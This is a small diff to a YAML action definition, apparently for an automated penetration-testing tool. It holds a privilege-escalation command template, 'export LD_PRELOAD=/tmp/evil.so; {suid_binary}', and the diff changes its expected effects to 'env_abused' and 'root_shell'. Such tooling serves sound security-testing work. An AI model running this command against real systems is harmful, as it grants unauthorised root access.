@@ -6,9 +6,10 @@ preconditions:
 parameters:
   target_ip: from_engagement.target_ip
 command_template: export LD_PRELOAD=/tmp/evil.so; {suid_binary}
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- env_abused
+- root_shell
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
